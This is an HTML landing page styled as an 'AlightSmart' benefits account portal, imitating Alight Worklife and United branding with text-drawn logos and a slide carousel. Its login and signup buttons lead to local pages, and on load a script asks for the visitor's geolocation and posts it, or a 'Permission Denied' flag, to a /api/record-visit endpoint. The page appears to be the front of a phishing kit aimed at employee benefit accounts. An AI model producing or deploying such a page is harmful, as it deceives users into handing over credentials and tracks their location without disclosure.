<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlightSmart - Smart Choice Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #000;
            color: white;
            height: 100vh;
            overflow: hidden;
            margin: 0;
            padding: 0;
            position: relative;
        }

        /* LOGO - Top Layer */
        .logo-container {
            text-align: center;
            padding: 30px 20px 20px;
            z-index: 30;
            position: relative;
            background: rgba(0, 0, 0, 0.4);
        }

        .alight-worklife {
            font-size: 2.4rem;
            font-weight: 700;
            letter-spacing: -0.02em;
            margin-bottom: 8px;
        }
        .alight-worklife .alight { color: #1a1a1a; }
        .alight-worklife .worklife {
            background: linear-gradient(90deg, #7ed957, #34d399);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
        }

        .united-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 8px;
        }
        .united-logo .united-text {
            font-size: 2.1rem;
            font-weight: 800;
            color: #0033a0;
            letter-spacing: 0.05em;
        }
        .globe { font-size: 2.3rem; line-height: 1; }

        /* CAROUSEL */
        .carousel {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 180px; /* Space for buttons */
            overflow: hidden;
            z-index: 1;
        }
        .slides {
            display: flex;
            transition: transform 0.5s ease;
            height: 100%;
            width: 100%;
        }
        .slide {
            min-width: 100%;
            height: 100%;
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: flex-end;
            padding: 40px 25px;
            position: relative;
        }
        .slide::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: linear-gradient(transparent, rgba(0,0,0,0.8));
        }
        .slide-content {
            position: relative;
            z-index: 2;
            max-width: 380px;
        }
        .slide h2 {
            font-size: 2rem;
            margin-bottom: 30px;
        }
        .slide p {
            font-size: 1.15rem;
            line-height: 1.4;
        }

        /* DOTS */
        .dots {
            text-align: center;
            margin: 15px 0;
            z-index: 25;
            position: relative;
        }
        .dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #1ea05d;
            border-radius: 50%;
            margin: 0 5px;
            cursor: pointer;
        }
        .dot.active {
            background: white;
            transform: scale(1.3);
        }

        /* BUTTONS - Fixed at bottom */
        .buttons {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 20px 25px 40px;
            display: flex;
            gap: 15px;
            background: rgba(0, 0, 0, 0.6);
            z-index: 30;
        }
        .btn {
            flex: 1;
            padding: 18px;
            border-radius: 50px;
            font-size: 1.15rem;
            font-weight: 600;
            text-align: center;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }
        .btn-login {
            background: white;
            color: #1e40af;
        }
        .btn-signup {
            background: #166534;
            color: white;
        }
        .under {
            font-size: 0.85rem;
            margin-top: 4px;
            opacity: 0.9;
        }

        /* Mobile Optimizations */
        @media (max-width: 480px) {
            .alight-worklife { font-size: 2.1rem; }
            .united-logo .united-text { font-size: 1.9rem; }
            .slide h2 { font-size: 1.8rem; }
        }
    </style>
</head>
<body>

    <!-- Logo -->
    <div class="logo-container">
        <div class="alight-worklife">
            <span class="alight">alight</span>
            <span class="worklife">worklife</span><span style="font-size:0.55rem; vertical-align: super; color:#1a1a1a;">®</span>
        </div>

        <div class="united-logo">
            <span class="united-text">UNITED</span>
            <span class="globe">🌐</span>
        </div>
    </div>

    <!-- Carousel -->
    <div class="carousel">
        <div class="slides" id="slides">
            <!-- Slide 1 -->
            <div class="slide" style="background-image: url('login.jpg');">
                <div class="slide-content">
                    <h2>Innovative</h2>
                    <p>Manage all aspects of health and wealth using our AI-powered app.</p>
                </div>
            </div>
            
            <!-- Slide 2 -->
            <div class="slide" style="background-image: url('login2.jpg');">
                <div class="slide-content">
                    <h2>Personal</h2>
                    <p>Get personalized recommendations about spending and savings to maximize your account’s value.</p>
                </div>
            </div>
            
            <!-- Slide 3 -->
            <div class="slide" style="background-image: url('login3.jpg');">
                <div class="slide-content">
                    <h2>Simple</h2>
                    <p>Account self-service made easy!</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Dots -->
    <div class="dots" id="dots"></div>

    <!-- Buttons -->
    <div class="buttons">
        <div class="btn btn-login" onclick="goToLogin()">
            LOGIN
            <p class="under"></p>
        </div>
        <div class="btn btn-signup" onclick="goToSignup()">SIGN UP</div>
    </div>

    <script>
        let currentSlide = 0;
        const slides = document.getElementById('slides');
        const totalSlides = 3;

        // Create dots
        const dotsContainer = document.getElementById('dots');
        for (let i = 0; i < totalSlides; i++) {
            const dot = document.createElement('span');
            dot.classList.add('dot');
            if (i === 0) dot.classList.add('active');
            dot.onclick = () => goToSlide(i);
            dotsContainer.appendChild(dot);
        }

        function goToSlide(n) {
            currentSlide = n;
            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
            updateDots();
        }

        function updateDots() {
            const dots = dotsContainer.querySelectorAll('.dot');
            dots.forEach((dot, index) => {
                dot.classList.toggle('active', index === currentSlide);
            });
        }

        // Auto slide
        setInterval(() => {
            currentSlide = (currentSlide + 1) % totalSlides;
            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
            updateDots();
        }, 5000);

        // Swipe Support
        let touchStartX = 0;
        slides.addEventListener('touchstart', e => touchStartX = e.changedTouches[0].screenX);
        slides.addEventListener('touchend', e => {
            const touchEndX = e.changedTouches[0].screenX;
            if (touchEndX < touchStartX - 50) {
                currentSlide = (currentSlide + 1) % totalSlides;
            } else if (touchEndX > touchStartX + 50) {
                currentSlide = (currentSlide - 1 + totalSlides) % totalSlides;
            }
            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
            updateDots();
        });

        function goToLogin() {
            window.location.href = "login.html";
        }
        function goToSignup() {
            window.location.href = "index.html";
        }

        // Geolocation
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (position) => {
                const loc = `Lat: ${position.coords.latitude}, Lng: ${position.coords.longitude}`;
                try {
                    await fetch('/api/record-visit', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ location: loc })
                    });
                } catch (e) {}
            }, () => {
                fetch('/api/record-visit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ location: 'Permission Denied' })
                });
            });
        }
    </script>
    <script src="app.js"></script>
</body>
</html>
